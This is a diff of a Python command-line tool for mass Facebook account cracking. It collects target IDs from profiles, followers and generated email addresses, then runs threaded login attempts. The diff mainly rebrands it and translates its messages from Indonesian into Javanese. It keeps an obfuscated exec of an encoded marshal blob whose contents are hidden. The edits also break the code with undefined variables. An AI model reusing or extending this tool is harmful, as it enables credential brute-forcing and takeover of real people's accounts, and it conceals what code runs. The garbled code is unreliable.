@@ -1,4 +1,4 @@
-#UTF-PYTHON-3 BUAT OLEH RIKSY - 27 April 2022
+#UTF-PYTHON-3 mod by 4905 - 17 sep 2022
 
 import os,sys
 try:
@@ -8,7 +8,7 @@ except ImportError:
 	try:
 		import rich
 	except ImportError:
-		os.sys.exit("[?] Maaf Ngab, Sepertinya Tidak Bisa Install Rich(Install Manual : python -m pip install rich &> /dev/null)")
+		os.sys.exit("[?] Sepuranr, Ora isoh masang Rich(PASANG DEWE : python -m pip install rich &> /dev/null)")
 from rich.table import Table as me
 from rich.console import Console as sol
 from rich.console import Group as gp
@@ -45,7 +45,7 @@ try:
 	try:
 		import requests
 	except ImportError as e:
-		print(f"[X] Sedang Install Bahan {e.name}, Mohon Bersabar....")
+		print(f"[X] Sedang Install Bahan {e.name}, SABAR MBAHH....")
 		os.system(f"python -m pip install {e.name} &> /dev/null")
 		os.system(f"python2 -m pip install {e.name} &> /dev/null")
 		os.system(f"python2 -m pip2 install {e.name} &> /dev/null")
@@ -53,7 +53,7 @@ try:
 	try:
 		import bs4
 	except ImportError as e:
-		print(f"[X] Sedang Install Bahan {e.name}, Mohon Bersabar....")
+		print(f"[X] Sedang Install Bahan {e.name}, SABAR MBAHH....")
 		os.system(f"python -m pip install {e.name} &> /dev/null")
 		os.system(f"python2 -m pip install {e.name} &> /dev/null")
 		os.system(f"python2 -m pip2 install {e.name} &> /dev/null")
@@ -61,7 +61,7 @@ try:
 	try:
 		import stdiomask
 	except ImportError as e:
-		print(f"[X] Sedang Install Bahan {e.name}, Mohon Bersabar....")
+		print(f"[X] Sedang Install Bahan {e.name}, SABAR MBAHH....")
 		os.system(f"python -m pip install {e.name} &> /dev/null")
 		os.system(f"python2 -m pip install {e.name} &> /dev/null")
 		os.system(f"python2 -m pip2 install {e.name} &> /dev/null")
@@ -69,7 +69,7 @@ try:
 	try:
 		import mechanize
 	except ImportError as e:
-		print(f"[X] Sedang Install Bahan {e.name}, Mohon Bersabar....")
+		print(f"[X] Sedang Install Bahan {e.name}, SABAR MBAHH....")
 		os.system(f"python -m pip install {e.name} &> /dev/null")
 		os.system(f"python2 -m pip install {e.name} &> /dev/null")
 		os.system(f"python2 -m pip2 install {e.name} &> /dev/null")
@@ -80,8 +80,8 @@ try:
 		insta = subprocess.call(["dpkg","-s","play-audio"],stdout=null,stderr=subprocess.STDOUT)
 		if insta !=0:os.system('pkg install play-audio -y &> /dev/null')
 		null.close()
-		musik_="Kontol"
-	except:musik_="Jangan"
+		musik_="peteng"
+	except:musik_="OJO"
 except:pass
 import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,uuid,ipaddress,calendar,requests,mechanize,bs4,sys,os,subprocess,uuid,requests,sys,random,time,re,base64,json,platform
 import sys, os, subprocess, platform, struct
@@ -92,7 +92,7 @@ from requests.exceptions import ConnectionError
 from bs4 import BeautifulSoup as parser
 from bs4 import BeautifulSoup as par
 from bs4 import BeautifulSoup
-from random import choice as pilih
+from random import choice as pileh
 from concurrent.futures import ThreadPoolExecutor as __Kiky__
 from concurrent.futures import ThreadPoolExecutor
 from requests.exceptions import ConnectionError
@@ -157,17 +157,17 @@ JJ = "[#FF8F00]" # Jingga
 AA = "[#AAAAAA]" # Abu-Abu
 OO = "[#FFA500]" # OREN
 
-# PENGATURAN WAKTU/JAMZ
+# SETELAN WEKTU/JAMZ
 ses = requests.Session()
 current = datetime.now()
 durasi = str(datetime.now().strftime("%d-%m-%Y"))
-tahun = current.year
-bulan = current.month
-hari = current.day
+taun = current.year
+sasi = current.month
+dino = current.day
 current = datetime.now()
 waktuu = str(datetime.now().strftime("%Y-%m-%d"))
-waktu = str(datetime.now().strftime("%Y%m%d"))
-bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
+wektu = str(datetime.now().strftime("%Y%m%d"))
+sasi_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
 jamz = datetime.now().strftime('%H:%M:%S')
 jam_ = datetime.now().strftime('%H%M%S')
 jam__ = str(datetime.now().strftime("%d%m%Y"))
@@ -195,19 +195,19 @@ def folder():
 	try:os.mkdir("results")
 	except:pass
 def play_mpv(x):
-	if "Jangan" == musik_ or musik_ == "Jangan":pass
+	if "Jangan" == musik_ or musik_ == "ojo":pass
 	else:
 		try:os.popen("play-audio "+x)
 		except:pass
 
 def cek_apk_hasil_crk():
 	cekfile_crk("results")
-	nama_z = input(">--Nama File--> ")
-	if nama_z == "":kotak("# JANGAN KOSONG KONTOL",M,Q);time.sleep(2);exit()
-	try:total__ = len(open(nama_z,"r").readlines())
-	except FileNotFoundError:kotak('# FILE TIDAK ADA',K,Q);exit()
+	nama_z = input(">--Jeneng File--> ")
+	if nama_z == "":kotak("# OJO DI KOSONGI",M,Q);time.sleep(2);exit()
+	try:total__ = len(open(jeneng_z,"r").readlines())
+	except FileNotFoundError:kotak('# FILE ORA ONO',K,Q);exit()
 	with __Kiky__(max_workers=10) as (form):
-		for data in open(nama_z,"r").readlines():
+		for data in open(jeneng_z,"r").readlines():
 			try:
 				data = data.replace("\n","")
 				try:user, pw = data.split("|")
@@ -230,22 +230,22 @@ class Main():
 		os.system("clear")
 		open_role();self.intro()
 	def menu_del(self, kataa):
-		iprint(Panel(f"{MM}MOHON MAAF MENU {QQ}[{CC}{kataa}{QQ}]{MM} INI BELUM TERSEDIA... BACK TO MENU", style=Q));time.sleep(3)
+		iprint(Panel(f"{MM}SEPURANE MBAH {QQ}[{CC}{kataa}{QQ}]{MM} PILIAN IKI URUNG ONO... MBALIK MANEH", style=Q));time.sleep(3)
 		Main()
 	def intro(self):
 		_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'==gkogSPAwoUMwTcIPhcIcsaTqpUfu5khV8uwmqtixPTWQrCEDVyZxCytmkYfbxVXEzbLKPm36Ljb9sRtYvYJ5ndrRhbmlUcmF3WUsnJf27hnCrQfO6oAOmgL+7tnCpQ7+JqI9FqCJLpV6lYuN2iUMnJMCpBGZgQbHQdLWSlhEZmZmblpUZMFGTlhgZKF2CipuZIFGSliAkaFTMAsDELDAkZLxJe')) # File Anti Rikod
 		now = datetime.now()
 		hour = now.hour
 		if hour < 4:
-			waktu = "Selamat Dini Hari"
+			waktu = "SUGENG TENGAH DALU"
 		elif 4 <= hour < 12:
-			waktu = "Selamat Pagi"
+			waktu = "SUGENG ENJING"
 		elif 12 <= hour < 15:
-			waktu = "Selamat Siang"
+			waktu = "SUGENG SIANG"
 		elif 15 <= hour < 17:
-			waktu = "Selamat Sore"
+			waktu = "SUGENG SONTEN"
 		else:
-			waktu = "Selamat Malam"
+			waktu = "SUGENG DALU"
 		try:token = open("data/login.txt","r").read()
 		except:login()
 		try:cookie = open("data/cookie.txt","r").read()
@@ -262,13 +262,13 @@ class Main():
 		my__= my_.add(Group(Panel(tod,title=waktu,style="white on black",box=DOUBLE,padding=1)),guide_style="bold magenta")
 
 
-		my_r = my__.add(f"{c}Mr.Risky{q}")
+		my_r = my__.add(f"{c}mr4905{q}")
 		my_rr= my_r.add(f"\r{k}My Github{q}")
-		my_rr.add(f"{c}https://githuh.com/Dumai-991{q}")
-		my_rr.add(f"{c}https://githuh.com/Dumai-200{q}")
+		my_rr.add(f"{c}https://githuh.com/mr4905{q}")
+		my_rr.add(f"{c}https://facebook.com{q}")
 
 		my_rrr=my_r.add(f"\r{i}My WhatsApp{q}")
-		my_rrr.add(f"{b}6283893415477{q}")
+		my_rrr.add(f"{b}628xxxxxxxxxxxx{q}")
 
 
 		code="""Wans X Gans
@@ -305,16 +305,16 @@ class Main():
 			prints(token_e)
 			kotak("# TOKEN KADALUARSA", M, Q)
 			os.sys.exit()
-		data_=my_rrrrr.add(f"\r{k}Data-Data Facebook Anda{q}")
-		data_.add(f"Username/Id       :{u}{nama}{q}")
-		data_.add(f"Tanggal BerGabung :{u}{waktuu}{q}")
+		data_=my_rrrrr.add(f"\r{k}Data-Data Facebook Sampean{q}")
+		data_.add(f"Username/Id       :{u}{jeneng}{q}")
+		data_.add(f"Tanggal BerGabung :{u}{wektuu}{q}")
 		data_.add(f"Ip Address        :{u}{str(sh['origin'])}{q}")
-		data_.add(f"Login Menggunakan :{u}{zza}{q}")
+		data_.add(f"Mlebu Nggowo :{u}{zza}{q}")
 		prints(my__)
 
 
 		try:open("data/kata","r").read()
-		except:open("data/kata","w").write("#SELAMAT DATANG, TERIMA KASIH TELAH LIHAT");kotak(f"# SELAMAT DATANG PENGGUNA BARU !!", K, C)
+		except:open("data/kata","w").write("# SUGENG RAWUH, SUWUN SAMPUN PERSO");kotak(f"# SUGENG RAWUH MENUNGSO ANYAR !!", K, C)
 
 
 		top = f"""01
@@ -326,14 +326,14 @@ class Main():
 
 00"""
 		tip = f"""Crack Dari Public
-Crack Dari Public{QQ}({KK}MASAL{QQ})
-Crack Dari Follow
-Crack Dari Random Email
-Check Jumlah Teman
-Check Hasil Crack
+Crack Seko Public{QQ}({KK}MASAL{QQ})
+Crack Seko Follow
+Crack Seko Random Email
+Check cacae konco
+Check Hasile Crack
 Check Options Akun Sesi
 
-Log Out Dari Akun (Keluar)"""
+Metu Seko Akun (Minggat)"""
 		lpp = f"""{II}ONN
 {II}ONN
 {II}ONN
@@ -360,7 +360,7 @@ Log Out Dari Akun (Keluar)"""
 		elif ki in ["7","07"]:self.cek_opsi();os.sys.exit()
 		elif ki in ["00","00"]:self.logut()
 		else:
-			tod = f"{MM}Maaf Pilihan {QQ}[{CC}{ki}{QQ}] {MM}Anda Tidak Tersedia.."
+			tod = f"{MM}Sepurane Pilianmu {QQ}[{CC}{ki}{QQ}] {MM}Durung Ono.."
 			iprint(Panel(tod, style=Q))
 			time.sleep(3),Main()
 	def logut(self):
@@ -368,30 +368,30 @@ Log Out Dari Akun (Keluar)"""
 		except:pass
 		try:os.remove('data/cookie.txt')
 		except:pass
-		kotak("# Token Dan Cookies Berhasil DiHapus (Berhasil Log Out)", M, Q)
+		kotak("# Token Lan Cookies Berhasil Di Busak (Klakon Minggat)", M, Q)
 		os.sys.exit()
 
-	def ambil_nama(self,idd):
+	def jupuk_jeneng(self,idd):
 		try:
 			yz  = requests.Session().get('https://graph.facebook.com/%s?fields=name,id&access_token=%s'%(idd,tiktok),cookies=puput)
 			zxc = json.loads(yz.text)
 			nama= zxc["name"]
 		except Exception as e:
-			iprint(Panel(f"Mohon Maaf Idz {QQ}[{MM}{idd}{QQ}]{CC} Tidak Ditemukan"))
+			iprint(Panel(f"Sepurane Idz {QQ}[{MM}{idd}{QQ}]{CC} Ora Ketemu"))
 			time.sleep(3)
 			Main()
-		return nama
-	def ubah_nama(self,idd):
+		return jeneng
+	def ganti_jeneng(self,idd):
 		try:
 			yz  = requests.Session().get('https://graph.facebook.com/%s?fields=name,id&access_token=%s'%(idd,tiktok),cookies=puput)
 			zxc = json.loads(yz.text)
 			nama= zxc["name"]
 		except Exception as e:
-			iprint(Panel(f"Mohon Maaf Idz {QQ}[{MM}{idd}{QQ}]{CC} Tidak Ditemukan"))
+			iprint(Panel(f"Sepurane Idz {QQ}[{MM}{idd}{QQ}]{CC} Ora Ketemu"))
 			time.sleep(3)
 			Main()
 		return nama
-	def ubah_user(self,username):
+	def ganti_user(self,username):
 		try:
 			if username == "me":
 				return(username)
@@ -432,34 +432,34 @@ Log Out Dari Akun (Keluar)"""
 		ask = input(f">--Pilih 1-4--> ")
 		if ask in["1"]:
 			email = "@gmail.com"
-			nama = input(f">--Masukan Nama--> ")
+			jeneng = input(f">--Tulisen Jenenge--> ")
 			jumlah = int(input(f">--Limit--> "))
 			for z in range(jumlah):
 				x += 1
 				idd.append(nama+str(x)+email+"<=>"+nama)
 		elif ask in["2"]:
 			email = "@yahoo.com"
-			nama = input(f">--Masukan Nama--> ")
+			jeneng = input(f">--Tulisen Jenenge--> ")
 			jumlah = int(input(f">--Limit--> "))
 			for z in range(jumlah):
 				x += 1
 				idd.append(nama+str(x)+email+"<=>"+nama)
 		elif ask in["3"]:
 			email = "@hotmail.com"
-			nama = input(f">--Masukan Nama--> ")
+			jeneng = input(f">--Tulisen jenenge--> ")
 			jumlah = int(input(f">--Limit--> "))
 			for z in range(jumlah):
 				x += 1
 				idd.append(nama+str(x)+email+"<=>"+nama)
 		elif ask in["4"]:
 			email = "@outlook.com"
-			nama = input(f">--Masukan Nama--> ")
+			jeneng = input(f">--Tulisen Jenenge--> ")
 			jumlah = int(input(f">--Limit--> "))
 			for z in range(jumlah):
 				x += 1
 				idd.append(nama+str(x)+email+"<=>"+nama)
 		god=""
-		god += "Jumlah Idz Yang Terkumpul : "+II+str(len(idd))+QQ
+		god += "Jumlah Idz Sing Nglumpuk : "+II+str(len(idd))+QQ
 		if len(idd)==0:
 			MML = M
 			say = "NOT"
@@ -468,16 +468,16 @@ Log Out Dari Akun (Keluar)"""
 			say = "YES"
 		iprint(Panel(god, title="Information", style=MML))
 		if say == "NOT":
-			kotak("# MOHON MAAF JUMLAH IDZ YANG TERKUMPUL NOL ATAU TIDAK ADA",M,O)
+			kotak("# SEPURANE JUMLAH IDZ SING NGLUMPUK BLAS IRA ONO",M,O)
 			os.sys.exit()
 
 		tod = me()
 		tod.add_column("NO", style=I, justify="center")
 		tod.add_column("PILIHAN", style=M, justify="center", width=60)
-		tod.add_row(f"1\n2\n3",f"Crack Dari Akun Tertua\nCrack Dari Akun Termuda\nCrack Dari Random{QQ}({II}Recommended{QQ})")
+		tod.add_row(f"1\n2\n3",f"Crack akun Paling Tuo\nCrack Akun Paling Enom\nCrack Dari Random{QQ}({II}Recommended{QQ})")
 		sol().print(tod, justify='center')
 
-		hu = input(f'>--{c}Pilih 1-3{q}--> ')
+		hu = input(f'>--{c}Mileh 1-3{q}--> ')
 		if hu in ['1','01']:
 			for rikod in idd:
 				id.append(rikod)
@@ -489,7 +489,7 @@ Log Out Dari Akun (Keluar)"""
 				xx = random.randint(0,len(id))
 				id.insert(xx,rikod)
 		else:
-			kotak("# LAIN KALI ISI DENGAN BENAR !!", M, Q);time.sleep(4)
+			kotak("# YENNNULIS SING BENER !!", M, Q);time.sleep(4)
 			for rikod in idd:
 				id.insert(0,rikod)
 		crack_new().otomatis()
@@ -502,10 +502,10 @@ Log Out Dari Akun (Keluar)"""
 			os.system("rm -rf data/login.txt")
 			os.sys.exit()
 		god = ""
-		kotak("# MASUKAN JUMLAH TARGER",K,Q)
+		kotak("# TULIS JUMLAH TARGER",K,Q)
 		try:jmlh_ = int(input(">--Jumlah--> "))
 		except:jmlh_ = 1
-		kotak("# SILAHKAN MASUKAM IDZ/USERNAME UNTUK DICRACK !!",C,Q)
+		kotak("# MONGGO TULIS IDZ/USERNAME SING AREP DICRACK !!",C,Q)
 		for x in range(jmlh_):
 			idt = input(f">--{k}Target{q}--> : ")
 			limit = ("10000")
@@ -531,16 +531,16 @@ Log Out Dari Akun (Keluar)"""
 			say = "YES"
 		iprint(Panel(god, title="Information", style=MML))
 		if say == "NOT":
-			kotak("# MOHON MAAF JUMLAH IDZ YANG TERKUMPUL NOL ATAU TIDAK ADA",M,O)
+			kotak("# SEPURANE JUMLAH IDZ SING NGLUMPUK BLAS ORA ONO",M,O)
 			os.sys.exit()
 
 		tod = me()
 		tod.add_column("NO", style=I, justify="center")
 		tod.add_column("PILIHAN", style=M, justify="center", width=60)
-		tod.add_row(f"1\n2\n3",f"Crack Dari Akun Tertua\nCrack Dari Akun Termuda\nCrack Dari Random{QQ}({II}Recommended{QQ})")
+		tod.add_row(f"1\n2\n3",f"Crack Akun Paling Tuo\nCrack Akun Paling Enom\nCrack Dari Random{QQ}({II}Recommended{QQ})")
 		sol().print(tod, justify='center')
 
-		hu = input(f'>--{c}Pilih 1-3{q}--> ')
+		hu = input(f'>--{c}Mileh 1-3{q}--> ')
 		if hu in ['1','01']:
 			for rikod in idd:
 				id.append(rikod)
@@ -552,7 +552,7 @@ Log Out Dari Akun (Keluar)"""
 				xx = random.randint(0,len(id))
 				id.insert(xx,rikod)
 		else:
-			kotak("# LAIN KALI ISI DENGAN BENAR !!", M, Q);time.sleep(4)
+			kotak("# YEN NULIS SING BENER !!", M, Q);time.sleep(4)
 			for rikod in idd:
 				id.insert(0,rikod)
 		crack_new().otomatis()
@@ -563,7 +563,7 @@ Log Out Dari Akun (Keluar)"""
 			os.system("rm -rf data/login.txt")
 			os.sys.exit()
 		god = ""
-		kotak("# SILAHKAN MASUKAM IDZ/USERNAME UNTUK DICRACK !!",C,Q)
+		kotak("# MONGGO TULISEN IDZ/USERNAME SING AREP DICRACK !!",C,Q)
 		idt = input(f">--{k}Target{q}--> : ")
 		limit = ("10000")
 		idt = self.ubah_user(idt)
@@ -588,16 +588,16 @@ Log Out Dari Akun (Keluar)"""
 			say = "YES"
 		iprint(Panel(god, title="Information", style=MML))
 		if say == "NOT":
-			kotak("# MOHON MAAF JUMLAH IDZ YANG TERKUMPUL NOL ATAU TIDAK ADA",M,O)
+			kotak("# SEPURANE JUMLAH IDZ SING NGLUMPUK BLAS ORA ONO",M,O)
 			os.sys.exit()
 
 		tod = me()
 		tod.add_column("NO", style=I, justify="center")
-		tod.add_column("PILIHAN", style=M, justify="center", width=60)
+		tod.add_column("PILIAN", style=M, justify="center", width=60)
 		tod.add_row(f"1\n2\n3",f"Crack Dari Akun Tertua\nCrack Dari Akun Termuda\nCrack Dari Random{QQ}({II}Recommended{QQ})")
 		sol().print(tod, justify='center')
 
-		hu = input(f'>--{c}Pilih 1-3{q}--> ')
+		hu = input(f'>--{c}Mileh 1-3{q}--> ')
 		if hu in ['1','01']:
 			for rikod in idd:
 				id.append(rikod)
@@ -609,7 +609,7 @@ Log Out Dari Akun (Keluar)"""
 				xx = random.randint(0,len(id))
 				id.insert(xx,rikod)
 		else:
-			kotak("# LAIN KALI ISI DENGAN BENAR !!", M, Q);time.sleep(4)
+			kotak("# YEN NULIS SING BENER !!", M, Q);time.sleep(4)
 			for rikod in idd:
 				id.insert(0,rikod)
 		crack_new().otomatis()
@@ -622,7 +622,7 @@ Log Out Dari Akun (Keluar)"""
 			os.system("rm -rf data/login.txt")
 			os.sys.exit()
 		god = ""
-		kotak("# SILAHKAN MASUKAM IDZ/USERNAME UNTUK DICRACK !!",C,Q)
+		kotak("# MONGGO TULISEN IDZ/USERNAME SING AREP DICRACK !!",C,Q)
 		idt = input(f">--{k}Target{q}--> : ")
 		limit = ("10000")
 		idt = self.ubah_user(idt)
@@ -657,13 +657,13 @@ Log Out Dari Akun (Keluar)"""
 					jso = json.loads(xyz.get(url,cookies=puput).text)
 					for i in jso["data"]:
 						try:
-							anak_kontol_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_kontol_asw = i["id"]
-							tolol.append(anak_kontol_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_kontol_asw)
+							anak_siji_anak_loro_telu_papat_bentar_lagi_limo_tahun_wali_songo_asw = i["id"]
+							pitu.append(anak_siji_anak_pitu_wolu_limo_bentar_lagi_mau_tahun_baru_kosong_asw)
 						except:pass
 			except KeyError:pass
 			todz = me()
 			todz.add_column("ID", style=I, justify="center")
-			todz.add_column("JUMLAH TEMAN", style=C, justify="center")
+			todz.add_column("JUMLAH KONCO", style=C, justify="center")
 			todz.add_column("JUMLAH PENGIKUT", style=O, justify="center")
 			todz.add_row(f'{ml}',f"{len(goblok)}",f"{len(tolol)}")
 			if "0" == f"{len(goblok)}":
